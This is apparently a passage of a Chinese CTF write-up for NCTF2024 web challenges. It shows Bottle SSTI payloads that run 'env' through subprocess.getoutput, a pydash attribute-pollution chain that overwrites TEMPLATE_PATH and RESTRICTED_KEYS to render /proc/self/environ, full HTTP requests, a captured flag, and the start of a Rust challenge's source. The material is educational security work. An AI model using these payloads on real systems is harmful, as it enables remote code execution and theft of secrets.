class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    path=bottle.request.json.get(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(path,<span class="built_in">str</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;no&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(name)&gt;<span class="number">6</span> <span class="keyword">or</span> <span class="built_in">len</span>(path)&gt;<span class="number">32</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;no&quot;</span></span><br><span class="line">    value=bottle.request.json.get(<span class="string">&#x27;value&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;yes&quot;</span> <span class="keyword">if</span> setval(name, path, value) <span class="keyword">else</span> <span class="string">&quot;no&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@bottle.get(<span class="params"><span class="string">&#x27;/render&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">render_template</span>():</span><br><span class="line">    path=bottle.request.query.get(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> path.find(<span class="string">&quot;&#123;&quot;</span>)&gt;=<span class="number">0</span> <span class="keyword">or</span> path.find(<span class="string">&quot;&#125;&quot;</span>)&gt;=<span class="number">0</span> <span class="keyword">or</span> path.find(<span class="string">&quot;.&quot;</span>)&gt;=<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hacker&quot;</span></span><br><span class="line">    <span class="keyword">return</span> bottle.template(path)</span><br><span class="line">bottle.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure><p>一道bottle框架的python题，考点是python原型链污染＋ssti</p><p>第一眼的思路就是先通过原型链污染污染模板标识符，然后直接ssti，但是此处它存在len(path)&gt;32，且name不能为bottle</p><p>最初想法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /setValue?name=bottle HTTP/1.1</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;path&quot;: &quot;BaseTemplate.settings&quot;,</span><br><span class="line">  &quot;value&quot;: &#123;</span><br><span class="line">    &quot;template_open&quot;: &quot;&lt;&lt;&quot;,</span><br><span class="line">    &quot;template_close&quot;: &quot;&gt;&gt;&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是上述这个不行，既然bottle不能用看，那想想globals里面又有什么可以用的，还不能有下划线，后来又想到了setvel这个函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /setValue?name=setval HTTP/1.1</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;path&quot;: &quot;__globals__[&#x27;bottle&#x27;].BaseTemplate.settings&quot;,</span><br><span class="line">  &quot;value&quot;: &#123;</span><br><span class="line">    &quot;template_open&quot;: &quot;&lt;&lt;&quot;,</span><br><span class="line">    &quot;template_close&quot;: &quot;&gt;&gt;&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是此处，path的长度又超标了。</p><p>然后当我阅读官方文档的时候，发现了一种奇特的模板渲染</p><img src="/2025/04/07/NCTF2024-web-wp/image-20250324110335117.png" class="" title="This is an example image"><p>好像不止<code>&#123;&#123;&#125;&#125;</code>可以渲染模板？？<code>&lt;%%&gt;</code>和<code>%</code>好像也可以？？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if path.find(&quot;&#123;&quot;)&gt;=0 or path.find(&quot;&#125;&quot;)&gt;=0 or path.find(&quot;.&quot;)&gt;=0:</span><br></pre></td></tr></table></figure><p>同时我们发现此处的ssti没有长度限制等，只限制了这三个，那么机会来了。</p><p>尝试构造payload，读取环境变量。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%%20from%20bottle%20import%20abort%0a%20from%20subprocess%20import%20getoutput%0a%20a=getoutput(&#x27;env&#x27;)%0a%20abort(404,a)%&gt;</span><br></pre></td></tr></table></figure><p>通过abort报错弹出a变量的值。</p><p><code>getoutput</code> 是 Python 的 <code>subprocess</code> 模块中的一个函数，用于执行命令并返回其输出。它是对 <code>os.popen</code> 的封装，使用起来更加简洁。如果你需要绕过点号（<code>.</code>）的限制来执行命令并获取输出，<code>getoutput</code> 是一个非常好的选择。</p><img src="/2025/04/07/NCTF2024-web-wp/image-20250324144504464.png" class="" title="This is an example image"><h2 id="ez-dash-revenge"><a href="#ez-dash-revenge" class="headerlink" title="ez_dash_revenge"></a>ez_dash_revenge</h2><p>修复ez_dash非预期</p><p>上面确实是非预期了，毕竟原型链污染都没有用到。。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Hints: Flag在环境变量中</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Optional</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="keyword">import</span> bottle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__forbidden_path__=[<span class="string">&#x27;__annotations__&#x27;</span>, <span class="string">&#x27;__call__&#x27;</span>, <span class="string">&#x27;__class__&#x27;</span>, <span class="string">&#x27;__closure__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__code__&#x27;</span>, <span class="string">&#x27;__defaults__&#x27;</span>, <span class="string">&#x27;__delattr__&#x27;</span>, <span class="string">&#x27;__dict__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__dir__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__eq__&#x27;</span>, <span class="string">&#x27;__format__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__ge__&#x27;</span>, <span class="string">&#x27;__get__&#x27;</span>, <span class="string">&#x27;__getattribute__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__gt__&#x27;</span>, <span class="string">&#x27;__hash__&#x27;</span>, <span class="string">&#x27;__init__&#x27;</span>, <span class="string">&#x27;__init_subclass__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__kwdefaults__&#x27;</span>, <span class="string">&#x27;__le__&#x27;</span>, <span class="string">&#x27;__lt__&#x27;</span>, <span class="string">&#x27;__module__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__ne__&#x27;</span>, <span class="string">&#x27;__new__&#x27;</span>, <span class="string">&#x27;__qualname__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__reduce__&#x27;</span>, <span class="string">&#x27;__reduce_ex__&#x27;</span>, <span class="string">&#x27;__repr__&#x27;</span>, <span class="string">&#x27;__setattr__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__sizeof__&#x27;</span>, <span class="string">&#x27;__str__&#x27;</span>, <span class="string">&#x27;__subclasshook__&#x27;</span>, <span class="string">&#x27;__wrapped__&#x27;</span>,</span><br><span class="line">               <span class="string">&quot;Optional&quot;</span>,<span class="string">&quot;render&quot;</span></span><br><span class="line">               ]</span><br><span class="line">__forbidden_name__=[</span><br><span class="line">    <span class="string">&quot;bottle&quot;</span></span><br><span class="line">]</span><br><span class="line">__forbidden_name__.extend(<span class="built_in">dir</span>(<span class="built_in">globals</span>()[<span class="string">&quot;__builtins__&quot;</span>]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setval</span>(<span class="params">name:<span class="built_in">str</span>, path:<span class="built_in">str</span>, value:<span class="built_in">str</span></span>)-&gt; <span class="type">Optional</span>[<span class="built_in">bool</span>]:</span><br><span class="line">    <span class="keyword">if</span> name.find(<span class="string">&quot;__&quot;</span>)&gt;=<span class="number">0</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> __forbidden_name__:</span><br><span class="line">        <span class="keyword">if</span> name==word:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> __forbidden_path__:</span><br><span class="line">        <span class="keyword">if</span> path.find(word)&gt;=<span class="number">0</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    obj=<span class="built_in">globals</span>()[name]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pydash.set_(obj,path,value)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@bottle.post(<span class="params"><span class="string">&#x27;/setValue&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_value</span>():</span><br><span class="line">    name = bottle.request.query.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    path=bottle.request.json.get(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(path,<span class="built_in">str</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;no&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(name)&gt;<span class="number">6</span> <span class="keyword">or</span> <span class="built_in">len</span>(path)&gt;<span class="number">32</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;no&quot;</span></span><br><span class="line">    value=bottle.request.json.get(<span class="string">&#x27;value&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;yes&quot;</span> <span class="keyword">if</span> setval(name, path, value) <span class="keyword">else</span> <span class="string">&quot;no&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@bottle.get(<span class="params"><span class="string">&#x27;/render&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">render_template</span>():</span><br><span class="line">    path=bottle.request.query.get(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(path)&gt;<span class="number">10</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hacker&quot;</span></span><br><span class="line">    blacklist=[<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;.&quot;</span>,<span class="string">&quot;%&quot;</span>,<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;_&quot;</span>] </span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> path:</span><br><span class="line">        <span class="keyword">if</span> c <span class="keyword">in</span> blacklist:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;hacker&quot;</span></span><br><span class="line">    <span class="keyword">return</span> bottle.template(path)</span><br><span class="line">bottle.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure><p>原本我们的想法是这样的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /setValue?name=setval HTTP/<span class="number">1.1</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;path&quot;</span>: <span class="string">&quot;__globals__[&#x27;bottle&#x27;].BaseTemplate.settings&quot;</span>,</span><br><span class="line">  <span class="string">&quot;value&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;template_open&quot;</span>: <span class="string">&quot;&lt;&lt;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;template_close&quot;</span>: <span class="string">&quot;&gt;&gt;&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是现在ssti处<code>&lt;&lt;&gt;&gt;</code>也被ban了。那么污染的肯定就不是BaseTemplate.settings了。</p><p>我们看看官方文档，找不到什么东西了，看看源码好了</p><img src="/2025/04/07/NCTF2024-web-wp/image-20250324153035112.png" class="" title="This is an example image"><p>发现几个属性，问问ai</p><img src="/2025/04/07/NCTF2024-web-wp/image-20250324153104189.png" class="" title="This is an example image"><img src="/2025/04/07/NCTF2024-web-wp/image-20250324153124789.png" class="" title="This is an example image"><p>可以设置模板文件的搜索路径？！有点类似于python原型链污染Flask中的_static_url_path，改变静态文件路径。</p><p>那么如果将TEMPLATE_PATH污染成&#x2F;proc&#x2F;self&#x2F;，那么访问&#x2F;render路由时，bottle会在&#x2F;proc&#x2F;self&#x2F;种查找path进行渲染？！</p><img src="/2025/04/07/NCTF2024-web-wp/image-20250324153718275.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /setValue?name=setval HTTP/1.1</span><br><span class="line">Host: 39.106.16.204:16613</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Priority: u=0, i</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 5</span><br><span class="line"></span><br><span class="line">&#123;&quot;path&quot;:&quot;__globals__.bottle.TEMPLATE_PATH&quot;,&quot;value&quot;:[&#x27;./&#x27;, &#x27;./views/&#x27;,&#x27;/proc/self/&#x27;]&#125;</span><br></pre></td></tr></table></figure><img src="/2025/04/07/NCTF2024-web-wp/image-20250324154432128.png" class="" title="This is an example image"><p>但是这里回显no，看一下源码，发现长度限制都是成功绕过的，唯一的可能就是setval的时候没有污染成功，这又是为什么呢？？</p><p>这里问了很久的ai</p><img src="/2025/04/07/NCTF2024-web-wp/image-20250324162534787.png" class="" title="This is an example image"><p>然后我们在pydash的helpers中发现了！</p><img src="/2025/04/07/NCTF2024-web-wp/image-20250324162641516.png" class="" title="This is an example image"><img src="/2025/04/07/NCTF2024-web-wp/image-20250324162659714.png" class="" title="This is an example image"><p>那么我们也要讲pydash helpers中的RESTRICTED_KEYS污染掉，污染成什么都可以。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /setValue?name=pydash HTTP/1.1</span><br><span class="line">Host: 39.106.16.204:16613</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Priority: u=0, i</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 5</span><br><span class="line"></span><br><span class="line">&#123;&quot;path&quot;:&quot;helpers.RESTRICTED_KEYS&quot;,&quot;value&quot;:&quot;MeteorKai&quot;&#125;</span><br></pre></td></tr></table></figure><p>接下来依次发包！</p><img src="/2025/04/07/NCTF2024-web-wp/image-20250324163026696.png" class="" title="This is an example image"><img src="/2025/04/07/NCTF2024-web-wp/image-20250324163038819.png" class="" title="This is an example image"><img src="/2025/04/07/NCTF2024-web-wp/image-20250324163048671.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NCTF&#123;b67eecfa-d24d-4061-8dd1-4bdfa7a2f938&#125;</span><br></pre></td></tr></table></figure><h2 id="internal-api"><a href="#internal-api" class="headerlink" title="internal_api"></a>internal_api</h2><p>rust语言的。</p><p>先看看源码，main.rs：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::&#123;env, net::SocketAddr, sync::Arc&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> axum::&#123;</span><br><span class="line">    Router,</span><br><span class="line">    routing::&#123;get, post&#125;,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">use</span> internal_api::&#123;db, route&#125;;</span><br><span class="line"><span class="keyword">use</span> tokio::net::TcpListener;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[tokio::main]</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">main</span>() <span class="punctuation">-&gt;</span> anyhow::<span class="type">Result</span>&lt;()&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">db_name</span> = env::<span class="title function_ invoke__">var</span>(<span class="string">&quot;DB_NAME&quot;</span>)?;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">json_name</span> = env::<span class="title function_ invoke__">var</span>(<span class="string">&quot;JSON_NAME&quot;</span>)?;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">flag</span> = env::<span class="title function_ invoke__">var</span>(<span class="string">&quot;FLAG&quot;</span>)?;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">pool</span> = db::<span class="title function_ invoke__">init</span>(db_name, json_name, flag)?;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">app</span> = Router::<span class="title function_ invoke__">new</span>()</span><br><span class="line">        .<span class="title function_ invoke__">route</span>(<span class="string">&quot;/&quot;</span>, <span class="title function_ invoke__">get</span>(route::index))</span><br><span class="line">        .<span class="title function_ invoke__">route</span>(<span class="string">&quot;/report&quot;</span>, <span class="title function_ invoke__">post</span>(route::report))</span><br><span class="line">        .<span class="title function_ invoke__">route</span>(<span class="string">&quot;/search&quot;</span>, <span class="title function_ invoke__">get</span>(route::public_search))</span><br><span class="line">        .<span class="title function_ invoke__">route</span>(<span class="string">&quot;/internal/search&quot;</span>, <span class="title function_ invoke__">get</span>(route::private_search))</span><br><span class="line">        .<span class="title function_ invoke__">with_state</span>(Arc::<span class="title function_ invoke__">new</span>(pool));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">addr</span> = <span class="built_in">format!</span>(<span class="string">&quot;&#123;&#125;:&#123;&#125;&quot;</span>, env::<span class="title function_ invoke__">var</span>(<span class="string">&quot;HOST&quot;</span>)?, env::<span class="title function_ invoke__">var</span>(<span class="string">&quot;PORT&quot;</span>)?);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">listener</span> = TcpListener::<span class="title function_ invoke__">bind</span>(addr).<span class="keyword">await</span>?;</span><br><span class="line">    axum::<span class="title function_ invoke__">serve</span>(</span><br><span class="line">        listener,</span><br><span class="line">        app.into_make_service_with_connect_info::&lt;SocketAddr&gt;(),</span><br><span class="line">    )</span><br><span class="line">    .<span class="keyword">await</span>?;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">Ok</span>(())</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>router.rs：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::&#123;net::SocketAddr, sync::Arc&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> anyhow::anyhow;</span><br><span class="line"><span class="keyword">use</span> axum::&#123;</span><br><span class="line">    Form, Json,</span><br><span class="line">    extract::&#123;ConnectInfo, Query, State&#125;,</span><br><span class="line">    response::Html,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">use</span> serde_json::&#123;Value, json&#125;;</span><br><span class="line"><span class="keyword">use</span> tokio::task;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> crate::&#123;</span><br><span class="line">    bot,</span><br><span class="line">    db::&#123;<span class="keyword">self</span>, DbPool&#125;,</span><br><span class="line">    error::AppError,</span><br><span class="line">    model::&#123;Report, Search&#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">index</span>() <span class="punctuation">-&gt;</span> Html&lt;<span class="type">String</span>&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">content</span> = <span class="built_in">include_str!</span>(<span class="string">&quot;../public/index.html&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">Html</span>(content.<span class="title function_ invoke__">to_string</span>())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">report</span>(<span class="title function_ invoke__">Form</span>(report): Form&lt;Report&gt;) <span class="punctuation">-&gt;</span> Json&lt;Value&gt; &#123;</span><br><span class="line">    task::<span class="title function_ invoke__">spawn</span>(<span class="keyword">async</span> <span class="keyword">move</span> &#123; bot::<span class="title function_ invoke__">visit_url</span>(report.url).<span class="keyword">await</span>.<span class="title function_ invoke__">unwrap</span>() &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">Json</span>(json!(&#123;</span><br><span class="line">        <span class="string">&quot;message&quot;</span>: <span class="string">&quot;bot will visit the url soon&quot;</span></span><br><span class="line">    &#125;))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">public_search</span>(</span><br><span class="line">    <span class="title function_ invoke__">Query</span>(search): Query&lt;Search&gt;,</span><br><span class="line">    <span class="title function_ invoke__">State</span>(pool): State&lt;Arc&lt;DbPool&gt;&gt;,</span><br><span class="line">) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;Json&lt;<span class="type">Vec</span>&lt;<span class="type">String</span>&gt;&gt;, AppError&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">pool</span> = pool.<span class="title function_ invoke__">clone</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">conn</span> = pool.<span class="title function_ invoke__">get</span>()?;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">comments</span> = db::<span class="title function_ invoke__">search</span>(conn, search.s, <span class="literal">false</span>)?;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> comments.<span class="title function_ invoke__">len</span>() &gt; <span class="number">0</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">Ok</span>(<span class="title function_ invoke__">Json</span>(comments))</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">Err</span>(anyhow!(<span class="string">&quot;No comments found&quot;</span>).<span class="title function_ invoke__">into</span>())</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">private_search</span>(</span><br><span class="line">    <span class="title function_ invoke__">Query</span>(search): Query&lt;Search&gt;,</span><br><span class="line">    <span class="title function_ invoke__">State</span>(pool): State&lt;Arc&lt;DbPool&gt;&gt;,</span><br><span class="line">    <span class="title function_ invoke__">ConnectInfo</span>(addr): ConnectInfo&lt;SocketAddr&gt;,</span><br><span class="line">) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;Json&lt;<span class="type">Vec</span>&lt;<span class="type">String</span>&gt;&gt;, AppError&gt; &#123;</span><br><span class="line">    <span class="comment">// 以下两个 if 与题目无关, 你只需要知道: private_search 路由仅有 bot 才能访问</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 本地环境 (docker compose)</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">bot_ip</span> = tokio::net::<span class="title function_ invoke__">lookup_host</span>(<span class="string">&quot;bot:4444&quot;</span>).<span class="keyword">await</span>?.<span class="title function_ invoke__">next</span>().<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">    <span class="keyword">if</span> addr.<span class="title function_ invoke__">ip</span>() != bot_ip.<span class="title function_ invoke__">ip</span>() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">Err</span>(anyhow!(<span class="string">&quot;only bot can access&quot;</span>).<span class="title function_ invoke__">into</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 远程环境 (k8s)</span></span><br><span class="line">    